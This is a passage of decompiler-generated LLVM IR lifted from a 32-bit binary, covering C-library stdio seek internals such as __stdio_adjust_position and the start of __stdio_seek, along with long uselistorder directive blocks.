  %v2_804fcdb = inttoptr i32 %v1_804fcdb to i32*
  %v3_804fcdb = load i32, i32* %v2_804fcdb, align 4
  %v1_804fcde = icmp eq i32 %v3_804fcdb, 0
  %v1_804fce0 = icmp eq i1 %v1_804fcde, false
  br i1 %v1_804fce0, label %dec_label_pc_804fd01, label %dec_label_pc_804fce2

dec_label_pc_804fce2:                             ; preds = %dec_label_pc_804fcdb
  %v1_804fce2 = add i32 %v4_804fcb7, 56
  store i32 %v1_804fce2, i32* @ebx, align 4
  %v2_804fcec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fcec, i32* @eax, align 4
  %v3_804fcf1 = call i32 @__pthread_return_void(i32 %v2_804fcec, i32 134526871)
  store i32 %v3_804fcf1, i32* %eax.global-to-local, align 4
  %v0_804fcf6 = load i32, i32* @ebx, align 4
  %v2_804fcf9 = call i32 @__pthread_return_0(i32 %v0_804fcf6)
  store i32 %v2_804fcf9, i32* %eax.global-to-local, align 4
  %v0_804fd01.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fd01

dec_label_pc_804fd01:                             ; preds = %dec_label_pc_804fcdb, %dec_label_pc_804fce2
  %v0_804fd09 = phi i32 [ %v4_804fcb7, %dec_label_pc_804fcdb ], [ %v0_804fd01.pre, %dec_label_pc_804fce2 ]
  %v1_804fd01 = inttoptr i32 %v0_804fd09 to i8*
  %v2_804fd01 = load i8, i8* %v1_804fd01, align 1
  %v3_804fd01 = and i8 %v2_804fd01, 64
  %v4_804fd01 = icmp eq i8 %v3_804fd01, 0
  br i1 %v4_804fd01, label %dec_label_pc_804fd16, label %dec_label_pc_804fd06

dec_label_pc_804fd06:                             ; preds = %dec_label_pc_804fd01
  %v2_804fd0a = call i32 @__stdio_wcommit(i32 %v0_804fd09)
  store i32 %v2_804fd0a, i32* %eax.global-to-local, align 4
  %v1_804fd12 = icmp eq i32 %v2_804fd0a, 0
  %v1_804fd14 = icmp eq i1 %v1_804fd12, false
  br i1 %v1_804fd14, label %dec_label_pc_804fd69, label %dec_label_pc_804fd16

dec_label_pc_804fd16:                             ; preds = %dec_label_pc_804fd06, %dec_label_pc_804fd01
  %v0_804fd16 = load i32, i32* @edi, align 4
  %v9_804fd16 = icmp eq i32 %v0_804fd16, 1
  %v1_804fd19 = icmp eq i1 %v9_804fd16, false
  br i1 %v1_804fd19, label %dec_label_pc_804fd16.dec_label_pc_804fd2f_crit_edge, label %dec_label_pc_804fd1b

dec_label_pc_804fd16.dec_label_pc_804fd2f_crit_edge: ; preds = %dec_label_pc_804fd16
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804fd2f

dec_label_pc_804fd1b:                             ; preds = %dec_label_pc_804fd16
  %v0_804fd1b = load i32, i32* @ecx, align 4
  %v2_804fd1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804fd1d, i32* %eax.global-to-local, align 4
  %v0_804fd22 = load i32, i32* @esi, align 4
  %v5_804fd22 = inttoptr i32 %v0_804fd22 to i16*
  %v6_804fd23 = call i32 @__stdio_adjust_position(i16* %v5_804fd22, i32 %v2_804fd1d, i32 %v0_804fd1b, i32 %v0_804fd1b)
  store i32 %v6_804fd23, i32* %eax.global-to-local, align 4
  %v2_804fd2b = icmp slt i32 %v6_804fd23, 0
  br i1 %v2_804fd2b, label %dec_label_pc_804fd69, label %dec_label_pc_804fd1b.dec_label_pc_804fd2f_crit_edge

dec_label_pc_804fd1b.dec_label_pc_804fd2f_crit_edge: ; preds = %dec_label_pc_804fd1b
  %v0_804fd30.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fd2f

dec_label_pc_804fd2f:                             ; preds = %dec_label_pc_804fd16.dec_label_pc_804fd2f_crit_edge, %dec_label_pc_804fd1b.dec_label_pc_804fd2f_crit_edge
  %v2_804fd31.pre-phi = phi i32 [ %.pre6, %dec_label_pc_804fd16.dec_label_pc_804fd2f_crit_edge ], [ %v2_804fd1d, %dec_label_pc_804fd1b.dec_label_pc_804fd2f_crit_edge ]
  %v0_804fd30 = phi i32 [ %v0_804fd16, %dec_label_pc_804fd16.dec_label_pc_804fd2f_crit_edge ], [ %v0_804fd30.pre, %dec_label_pc_804fd1b.dec_label_pc_804fd2f_crit_edge ]
  %v0_804fd2f = load i32, i32* @edx, align 4
  store i32 %v2_804fd31.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804fd36 = load i32, i32* @esi, align 4
  %v5_804fd37 = inttoptr i32 %v2_804fd31.pre-phi to i32*
  %v6_804fd37 = call i32 @__stdio_seek(i32 %v0_804fd36, i32* %v5_804fd37, i32 %v0_804fd30, i32 %v0_804fd2f)
  store i32 %v6_804fd37, i32* %eax.global-to-local, align 4
  %v2_804fd3f = icmp slt i32 %v6_804fd37, 0
  br i1 %v2_804fd3f, label %dec_label_pc_804fd69, label %dec_label_pc_804fd43

dec_label_pc_804fd43:                             ; preds = %dec_label_pc_804fd2f
  %v0_804fd43 = load i32, i32* @esi, align 4
  %v1_804fd43 = inttoptr i32 %v0_804fd43 to i32*
  %v2_804fd43 = load i32, i32* %v1_804fd43, align 4
  store i32 %v2_804fd43, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804fd47 = add i32 %v0_804fd43, 44
  %v2_804fd47 = inttoptr i32 %v1_804fd47 to i32*
  store i32 0, i32* %v2_804fd47, align 4
  %v0_804fd4e = load i32, i32* @esi, align 4
  %v1_804fd4e = add i32 %v0_804fd4e, 2
  %v2_804fd4e = inttoptr i32 %v1_804fd4e to i8*
  store i8 0, i8* %v2_804fd4e, align 1
  %v0_804fd52 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd52 = and i32 %v0_804fd52, -72
  store i32 %v1_804fd52, i32* %eax.global-to-local, align 4
  %v1_804fd55 = trunc i32 %v1_804fd52 to i16
  %v2_804fd55 = load i32, i32* @esi, align 4
  %v3_804fd55 = inttoptr i32 %v2_804fd55 to i16*
  store i16 %v1_804fd55, i16* %v3_804fd55, align 2
  %v0_804fd58 = load i32, i32* @esi, align 4
  %v1_804fd58 = add i32 %v0_804fd58, 8
  %v2_804fd58 = inttoptr i32 %v1_804fd58 to i32*
  %v3_804fd58 = load i32, i32* %v2_804fd58, align 4
  store i32 %v3_804fd58, i32* %eax.global-to-local, align 4
  %v2_804fd5b = add i32 %v0_804fd58, 16
  %v3_804fd5b = inttoptr i32 %v2_804fd5b to i32*
  store i32 %v3_804fd58, i32* %v3_804fd5b, align 4
  %v0_804fd5e = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd5e = load i32, i32* @esi, align 4
  %v2_804fd5e = add i32 %v1_804fd5e, 20
  %v3_804fd5e = inttoptr i32 %v2_804fd5e to i32*
  store i32 %v0_804fd5e, i32* %v3_804fd5e, align 4
  %v0_804fd61 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd61 = load i32, i32* @esi, align 4
  %v2_804fd61 = add i32 %v1_804fd61, 24
  %v3_804fd61 = inttoptr i32 %v2_804fd61 to i32*
  store i32 %v0_804fd61, i32* %v3_804fd61, align 4
  %v0_804fd64 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd64 = load i32, i32* @esi, align 4
  %v2_804fd64 = add i32 %v1_804fd64, 28
  %v3_804fd64 = inttoptr i32 %v2_804fd64 to i32*
  store i32 %v0_804fd64, i32* %v3_804fd64, align 4
  br label %dec_label_pc_804fd6c

dec_label_pc_804fd69:                             ; preds = %dec_label_pc_804fd2f, %dec_label_pc_804fd1b, %dec_label_pc_804fd06
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd6c

dec_label_pc_804fd6c:                             ; preds = %dec_label_pc_804fd43, %dec_label_pc_804fd69
  br i1 %v1_804fce0, label %dec_label_pc_804fd81, label %dec_label_pc_804fd70

dec_label_pc_804fd70:                             ; preds = %dec_label_pc_804fd6c
  %v2_804fd74 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fd74, i32* @eax, align 4
  %v3_804fd79 = call i32 @__pthread_return_void(i32 %v2_804fd74, i32 1)
  store i32 %v3_804fd79, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fd81

dec_label_pc_804fd81:                             ; preds = %dec_label_pc_804fd6c, %dec_label_pc_804fcc8, %dec_label_pc_804fd70
  %v0_804fd84 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804fd84, i32* %eax.global-to-local, align 4
  store i32 %v0_804fca7, i32* @ebx, align 4
  store i32 %v0_804fca6, i32* @esi, align 4
  store i32 %v0_804fca5, i32* @edi, align 4
  store i32 %v0_804fca4, i32* @ebp, align 4
  ret i32 %v0_804fd84

; uselistorder directives
  uselistorder i32 %v2_804fd31.pre-phi, { 1, 0 }
  uselistorder i32 %v0_804fd16, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 28, { 7, 8, 18, 9, 10, 11, 12, 13, 14, 1, 15, 19, 20, 16, 17, 21, 22, 32, 23, 33, 31, 24, 25, 0, 26, 27, 28, 29, 30, 3, 4, 5, 2, 6 }
  uselistorder i32 24, { 3, 4, 14, 15, 16, 5, 6, 7, 8, 9, 10, 11, 17, 18, 19, 22, 1, 20, 0, 2, 12, 21, 13 }
  uselistorder i32* @ecx, { 37, 38, 39, 30, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 26, 66, 67, 68, 69, 27, 70, 24, 28, 5, 7, 25, 6, 0, 111, 112, 71, 72, 73, 74, 75, 76, 77, 29, 78, 79, 80, 81, 82, 83, 13, 14, 1, 2, 84, 85, 15, 86, 87, 88, 89, 90, 92, 93, 94, 35, 36, 91, 113, 114, 16, 115, 116, 117, 118, 17, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 95, 102, 96, 97, 98, 99, 100, 101, 135, 136, 8, 9, 103, 3, 104, 137, 200, 138, 11, 20, 139, 140, 18, 10, 19, 141, 142, 143, 144, 145, 146, 196, 197, 198, 199, 12, 105, 4, 106, 31, 201, 202, 21, 107, 108, 109, 110, 203, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 22, 172, 148, 149, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 23, 188, 189, 191, 192, 193, 194, 190, 204, 147, 32, 205, 206, 33, 34, 195 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 1, 5, 4, 3, 2, 0 }
  uselistorder i8 0, { 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0, 64, 65, 66, 126, 67, 31, 3, 6, 7, 32, 5, 4, 127, 128, 129, 68, 69, 42, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 8, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 25, 93, 94, 95, 96, 97, 98, 99, 100, 44, 189, 101, 10, 135, 130, 131, 9, 133, 134, 132, 26, 136, 1, 2, 102, 103, 104, 137, 138, 28, 140, 11, 13, 118, 117, 12, 33, 141, 142, 143, 144, 145, 146, 147, 190, 148, 149, 150, 151, 152, 16, 158, 154, 155, 153, 14, 156, 157, 15, 27, 159, 160, 161, 162, 163, 164, 165, 179, 180, 18, 120, 119, 17, 121, 122, 166, 192, 34, 43, 29, 30, 123, 19, 191, 168, 169, 170, 171, 172, 173, 174, 175, 35, 176, 115, 139, 105, 20, 106, 107, 108, 109, 110, 111, 112, 113, 114, 116, 124, 125, 167, 177, 178, 181, 182, 187, 186, 21, 183, 184, 23, 185, 22, 188, 24, 45, 36, 37, 38, 39, 40, 41 }
  uselistorder i8 64, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 (i32)* @__pthread_return_0, { 30, 26, 25, 24, 23, 22, 21, 5, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 4, 8, 29, 28, 27, 3, 2, 1, 6, 0, 7 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 53, 52, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1, 9, 8, 51, 50, 49, 48, 47, 46, 5, 4, 3, 0, 7, 6 }
  uselistorder i32 134526871, { 2, 17, 18, 3, 19, 4, 5, 20, 21, 22, 6, 7, 8, 24, 25, 26, 27, 28, 29, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 23 }
  uselistorder i32 56, { 3, 0, 4, 5, 6, 14, 7, 8, 9, 1, 10, 11, 12, 13, 2 }
  uselistorder i32 52, { 5, 6, 7, 13, 8, 9, 0, 10, 1, 2, 3, 4, 11, 12 }
  uselistorder i32 22, { 1, 2, 3, 8, 10, 11, 0, 4, 5, 6, 7, 9 }
  uselistorder i32* @esi, {}
  uselistorder i32* @edi, { 23, 3, 24, 25, 26, 118, 119, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 4, 38, 39, 40, 41, 42, 43, 44, 5, 120, 121, 19, 122, 123, 124, 18, 125, 45, 46, 6, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 20, 21, 22, 58, 8, 59, 60, 252, 253, 254, 9, 255, 256, 259, 260, 73, 74, 75, 76, 261, 262, 263, 126, 127, 2, 0, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 77, 11, 10, 78, 79, 80, 81, 82, 85, 83, 84, 143, 13, 144, 14, 145, 146, 12, 147, 148, 149, 150, 155, 156, 1, 151, 152, 153, 154, 157, 158, 159, 160, 15, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 264, 265, 266, 267, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 111, 112, 113, 114, 93, 94, 95, 268, 269, 270, 271, 279, 280, 86, 87, 88, 89, 90, 91, 92, 201, 202, 203, 204, 205, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 16, 240, 241, 242, 243, 244, 206, 207, 17, 208, 209, 210, 211, 212, 213, 214, 277, 278, 257, 258, 96, 97, 98, 281, 282, 99, 100, 215, 216, 101, 102, 103, 272, 273, 274, 275, 276, 104, 105, 106, 107, 108, 109, 110, 115, 116, 117, 245, 246, 247, 248, 249, 250, 251 }
  uselistorder i32* @ebp, { 8, 9, 10, 11, 12, 13, 14, 4, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 3, 36, 5, 6, 7, 37, 38, 39, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 40, 41, 42, 43, 44, 45, 46, 2, 75, 76, 77, 82, 78, 79, 80, 81, 83, 84, 0, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 47, 48, 49, 131, 132, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 162, 158, 159, 160, 161, 1, 163, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 144, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd81, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fd6c, { 1, 0 }
  uselistorder label %dec_label_pc_804fd2f, { 1, 0 }
  uselistorder label %dec_label_pc_804fd01, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_804fd94 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fd94, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_804fd9c = load i16, i16* %arg1, align 2
  %v3_804fd9c = zext i16 %v2_804fd9c to i32
  store i32 %v3_804fd9c, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_804fd9c, 4
  %v1_804fda1 = zext i16 %tmp to i32
  %v2_804fda1 = icmp eq i16 %tmp, 0
  br i1 %v2_804fda1, label %dec_label_pc_804fdd0, label %dec_label_pc_804fda6

dec_label_pc_804fda6:                             ; preds = %entry
  %v1_804fda8 = add nsw i32 %v1_804fda1, -1
  %v8_804fda8 = icmp eq i32 %v1_804fda8, 0
  store i32 %v1_804fda8, i32* @edx, align 4
  br i1 %v8_804fda8, label %dec_label_pc_804fdd0, label %dec_label_pc_804fdab

dec_label_pc_804fdab:                             ; preds = %dec_label_pc_804fda6
  %v3_804fdab = and i32 %v3_804fd9c, 2048
  %v4_804fdab = icmp eq i32 %v3_804fdab, 0
  br i1 %v4_804fdab, label %dec_label_pc_804fdd0, label %dec_label_pc_804fdb0

dec_label_pc_804fdb0:                             ; preds = %dec_label_pc_804fdab
  %v6_804fdb0 = sub nsw i32 1, %v1_804fda1
  %v7_804fdb0 = and i32 %v1_804fda8, %v6_804fdb0
  %v8_804fdb0 = icmp slt i32 %v7_804fdb0, 0
  %v9_804fdb0 = icmp eq i16 %tmp, 2
  %v10_804fdb0 = icmp ult i16 %tmp, 2
  %v3_804fdb3 = icmp eq i1 %v10_804fdb0, %v8_804fdb0
  %v4_804fdb3 = icmp eq i1 %v9_804fdb0, false
  %v5_804fdb3 = and i1 %v4_804fdb3, %v3_804fdb3
  br i1 %v5_804fdb3, label %dec_label_pc_804fe24, label %dec_label_pc_804fdb5

dec_label_pc_804fdb5:                             ; preds = %dec_label_pc_804fdb0
  %v1_804fdb5 = add i32 %v4_804fd94, 40
  %v2_804fdb5 = inttoptr i32 %v1_804fdb5 to i32*
  %v3_804fdb5 = load i32, i32* %v2_804fdb5, align 4
  %v4_804fdb5 = icmp eq i32 %v3_804fdb5, 0
  %v1_804fdb9 = icmp eq i1 %v4_804fdb5, false
  br i1 %v1_804fdb9, label %dec_label_pc_804fe24, label %dec_label_pc_804fdbb

dec_label_pc_804fdbb:                             ; preds = %dec_label_pc_804fdb5
  %v1_804fdbb = add i32 %v4_804fd94, 3
  %v2_804fdbb = inttoptr i32 %v1_804fdbb to i8*
  %v3_804fdbb = load i8, i8* %v2_804fdbb, align 1
  %v4_804fdbb = zext i8 %v3_804fdbb to i32
  %v2_804fdbf = sub nsw i32 %v1_804fda8, %v4_804fdbb
  %v1_804fdc1 = add i32 %v4_804fd94, 44
  %v2_804fdc1 = inttoptr i32 %v1_804fdc1 to i32*
  %v3_804fdc1 = load i32, i32* %v2_804fdc1, align 4
  %v1_804fdc5 = add nsw i32 %v2_804fdbf, -1
  %tmp11 = icmp slt i32 %v3_804fdc1, 1
  br i1 %tmp11, label %dec_label_pc_804fdd0, label %dec_label_pc_804fdca

dec_label_pc_804fdca:                             ; preds = %dec_label_pc_804fdbb
  %v1_804fdca = add i32 %v4_804fd94, 2
  %v2_804fdca = inttoptr i32 %v1_804fdca to i8*
  %v3_804fdca = load i8, i8* %v2_804fdca, align 1
  %v4_804fdca = zext i8 %v3_804fdca to i32
  %v2_804fdce = sub nsw i32 %v1_804fdc5, %v4_804fdca
  br label %dec_label_pc_804fdd0

dec_label_pc_804fdd0:                             ; preds = %dec_label_pc_804fdbb, %dec_label_pc_804fdab, %dec_label_pc_804fda6, %entry, %dec_label_pc_804fdca
  %v0_804fde5 = phi i32 [ %v1_804fdc5, %dec_label_pc_804fdbb ], [ %v1_804fda8, %dec_label_pc_804fdab ], [ 0, %dec_label_pc_804fda6 ], [ 0, %entry ], [ %v2_804fdce, %dec_label_pc_804fdca ]
  %v2_804fdd0 = and i32 %v3_804fd9c, 64
  %v3_804fdd0 = icmp eq i32 %v2_804fdd0, 0
  %storemerge.in.in.v = select i1 %v3_804fdd0, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_804fd94
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_804fddd = add i32 %v4_804fd94, 16
  %v3_804fddd = inttoptr i32 %v2_804fddd to i32*
  %v4_804fddd = load i32, i32* %v3_804fddd, align 4
  %v5_804fddd = sub i32 %storemerge, %v4_804fddd
  %v1_804fde0 = inttoptr i32 %arg2 to i32*
  %v2_804fde0 = load i32, i32* %v1_804fde0, align 4
  store i32 %v2_804fde0, i32* %ecx.global-to-local, align 4
  %v1_804fde2 = add i32 %arg2, 4
  %v2_804fde2 = inttoptr i32 %v1_804fde2 to i32*
  %v3_804fde2 = load i32, i32* %v2_804fde2, align 4
  store i32 %v3_804fde2, i32* %ebx.global-to-local, align 4
  %v2_804fde5 = add i32 %v5_804fddd, %v0_804fde5
  store i32 %v2_804fde5, i32* %esi.global-to-local, align 4
  %v5_804fdf9 = sub i32 %v2_804fde0, %v2_804fde5
  %v10_804fdf9 = icmp ult i32 %v2_804fde0, %v2_804fde5
  %v6_804fdfd = zext i1 %v10_804fdf9 to i32
  %tmp13 = icmp slt i32 %v2_804fde5, 0
  %v2_804fdea.neg = zext i1 %tmp13 to i32
  %v7_804fdfd = add i32 %v3_804fde2, %v2_804fdea.neg
  %v8_804fdfd = add i32 %v7_804fdfd, %v6_804fdfd
  store i32 %v8_804fdfd, i32* @edx, align 4
  store i32 %v5_804fdf9, i32* %v1_804fde0, align 4
  %v0_804fe03 = load i32, i32* @edx, align 4
  %v1_804fe03 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fe03 = add i32 %v1_804fe03, 4
  %v3_804fe03 = inttoptr i32 %v2_804fe03 to i32*
  store i32 %v0_804fe03, i32* %v3_804fe03, align 4
  %v0_804fe06 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe06 = add i32 %v0_804fe06, 4
  %v2_804fe06 = inttoptr i32 %v1_804fe06 to i32*
  %v3_804fe06 = load i32, i32* %v2_804fe06, align 4
  %v4_804fe06 = load i32, i32* %ebx.global-to-local, align 4
  %v5_804fe09 = icmp slt i32 %v3_804fe06, %v4_804fe06
  br i1 %v5_804fe09, label %dec_label_pc_804fe13, label %dec_label_pc_804fe0b

dec_label_pc_804fe0b:                             ; preds = %dec_label_pc_804fdd0
  %v8_804fe0b = icmp sgt i32 %v3_804fe06, %v4_804fe06
  br i1 %v8_804fe0b, label %dec_label_pc_804fe11, label %dec_label_pc_804fe0d

dec_label_pc_804fe0d:                             ; preds = %dec_label_pc_804fe0b
  %v1_804fe0d = inttoptr i32 %v0_804fe06 to i32*
  %v2_804fe0d = load i32, i32* %v1_804fe0d, align 4
  %v3_804fe0d = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_804fe0d, %v3_804fe0d
  br i1 %tmp14, label %dec_label_pc_804fe11, label %dec_label_pc_804fe13

dec_label_pc_804fe11:                             ; preds = %dec_label_pc_804fe0d, %dec_label_pc_804fe0b
  %v0_804fe11 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe11 = sub i32 0, %v0_804fe11
  store i32 %v1_804fe11, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe13

dec_label_pc_804fe13:                             ; preds = %dec_label_pc_804fe0d, %dec_label_pc_804fdd0, %dec_label_pc_804fe11
  %v0_804fe13 = load i32, i32* %esi.global-to-local, align 4
  %v2_804fe13 = icmp slt i32 %v0_804fe13, 0
  %v1_804fe15 = icmp eq i1 %v2_804fe13, false
  br i1 %v1_804fe15, label %dec_label_pc_804fe27, label %dec_label_pc_804fe17

dec_label_pc_804fe17:                             ; preds = %dec_label_pc_804fe13
  %v1_804fe17 = call i32 @__errno_location(i32 %v2_804fde5)
  %v1_804fe1c = inttoptr i32 %v1_804fe17 to i32*
  store i32 75, i32* %v1_804fe1c, align 4
  %v0_804fe2a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe27

dec_label_pc_804fe24:                             ; preds = %dec_label_pc_804fdb5, %dec_label_pc_804fdb0
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe27

dec_label_pc_804fe27:                             ; preds = %dec_label_pc_804fe13, %dec_label_pc_804fe17, %dec_label_pc_804fe24
  %v0_804fe2a = phi i32 [ %v0_804fe13, %dec_label_pc_804fe13 ], [ %v0_804fe2a.pre, %dec_label_pc_804fe17 ], [ -1, %dec_label_pc_804fe24 ]
  ret i32 %v0_804fe2a

; uselistorder directives
  uselistorder i32 %v4_804fe06, { 1, 0 }
  uselistorder i32 %v3_804fe06, { 1, 0 }
  uselistorder i32 %v2_804fde5, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_804fda8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_804fd94, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 16, { 21, 22, 23, 24, 25, 26, 54, 27, 28, 29, 30, 8, 55, 56, 57, 58, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 13, 46, 47, 48, 49, 96, 60, 59, 0, 61, 62, 9, 5, 63, 10, 97, 64, 65, 98, 99, 100, 66, 7, 6, 67, 68, 69, 70, 71, 72, 79, 73, 74, 75, 76, 77, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 11, 19, 14, 52, 20, 50, 90, 51, 101, 94, 2, 1, 95, 4, 3, 91, 92, 12, 53, 15, 93, 16, 17, 18 }
  uselistorder i32 8, { 30, 45, 46, 47, 48, 49, 50, 51, 32, 31, 52, 53, 54, 79, 80, 81, 82, 55, 83, 56, 84, 0, 1, 44, 57, 58, 59, 60, 62, 63, 64, 61, 65, 66, 67, 68, 16, 17, 69, 70, 71, 72, 73, 74, 153, 154, 155, 86, 85, 87, 2, 3, 88, 89, 90, 91, 92, 93, 6, 94, 4, 15, 156, 95, 96, 157, 158, 159, 97, 98, 99, 100, 101, 33, 18, 19, 20, 21, 34, 22, 23, 35, 36, 24, 37, 25, 38, 39, 160, 27, 161, 28, 162, 29, 43, 26, 75, 103, 102, 76, 77, 107, 108, 109, 110, 111, 112, 113, 7, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 8, 124, 125, 126, 127, 128, 41, 9, 42, 10, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 40, 146, 147, 11, 148, 149, 150, 151, 12, 152, 104, 105, 5, 78, 106, 14, 13 }
  uselistorder i32 20, { 1, 6, 2, 7, 8, 18, 19, 20, 9, 10, 11, 12, 13, 3, 14, 15, 21, 22, 23, 28, 24, 25, 4, 26, 0, 5, 16, 27, 17 }
  uselistorder i32 64, { 2, 7, 1, 3, 8, 0, 4, 6, 9, 5 }
  uselistorder i32 2, { 63, 64, 36, 65, 66, 46, 7, 8, 39, 40, 79, 31, 80, 81, 67, 68, 38, 9, 10, 69, 11, 70, 12, 41, 71, 72, 13, 82, 50, 84, 85, 28, 29, 30, 0, 1, 83, 86, 87, 88, 61, 89, 90, 91, 92, 93, 94, 73, 2, 74, 75, 33, 95, 96, 3, 51, 34, 4, 5, 97, 47, 98, 99, 100, 101, 62, 107, 108, 14, 113, 42, 114, 37, 60, 35, 15, 78, 32, 52, 16, 17, 43, 18, 19, 106, 20, 21, 48, 22, 102, 103, 104, 105, 6, 44, 76, 49, 77, 53, 23, 54, 24, 55, 56, 57, 58, 25, 26, 111, 45, 109, 27, 110, 112, 59 }
  uselistorder i32 44, { 3, 4, 6, 7, 8, 5, 0, 9, 18, 10, 2, 15, 17, 16, 12, 13, 14, 11, 1 }
  uselistorder i32 3, { 31, 0, 19, 11, 20, 29, 18, 13, 14, 32, 33, 34, 35, 36, 37, 21, 1, 12, 2, 22, 3, 15, 38, 23, 5, 4, 6, 9, 10, 8, 7, 30, 25, 39, 16, 17, 26, 27, 28, 24 }
  uselistorder i32 40, { 1, 7, 2, 3, 4, 5, 8, 9, 10, 11, 0, 6 }
  uselistorder i32 2048, { 3, 0, 4, 2, 1, 5 }
  uselistorder i16 0, { 4, 5, 7, 0, 8, 6, 9, 1, 10, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fe27, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fe13, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fdd0, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_804fe3c = add i32 %tmp5, 4
  %v2_804fe3c = inttoptr i32 %v1_804fe3c to i32*
  %v3_804fe3c = load i32, i32* %v2_804fe3c, align 4
